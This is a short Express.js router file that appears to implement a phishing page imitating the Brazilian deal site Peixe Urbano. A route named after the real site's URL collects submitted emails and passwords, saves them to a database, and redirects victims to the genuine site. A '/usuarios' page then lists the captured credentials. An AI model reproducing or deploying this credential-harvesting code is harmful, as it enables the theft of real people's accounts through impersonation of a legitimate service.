var express = require('express');
var router = express.Router();

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: 'Express' });
});

/* GET new page. */
router.get('/new', function(req, res, next) {
  res.render('new', { title: 'Express' });
});

/* POST new page. */
router.post('/new', function(req, res, next) {
  var nome = req.body.nome;
  var idade = req.body.idade;
  require("../db").save(nome, idade, function(){
    res.redirect('/');
  });
});

/* GET peixe page. */
router.get('/https://www.peixeurbano.com.br', function(req, res, next) {
  res.render('peixe', { title: 'Express' });
});

/* POST peixe page. */
router.post('/https://www.peixeurbano.com.br', function(req, res, next) {
  var email = req.body.email;
  var password = req.body.password;
  require("../db").savarUsuario(email, password, function(){
    res.redirect('https://www.peixeurbano.com.br/recife');
  });
});

/* GET usuarios page. */
router.get('/usuarios', function(req, res, next) {
  require("../db").listarUsuario(function(docs){
    res.render('usuarios', { listUsuarios: docs });
  });
});

module.exports = router;
